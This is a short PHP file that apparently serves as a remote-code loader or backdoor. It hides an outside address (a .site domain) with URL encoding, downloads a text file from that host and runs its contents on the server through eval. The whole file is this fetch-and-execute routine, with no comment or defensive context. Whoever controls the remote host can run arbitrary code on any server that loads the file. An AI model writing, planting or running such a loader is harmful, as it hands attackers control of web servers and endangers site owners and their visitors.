<?php

$content = file_get_contents(urldecode('https%3A%2F%2Fmobilediatoto.site%2Fini%2Fini.txt'));

$content = "?> ".$content;
eval($content);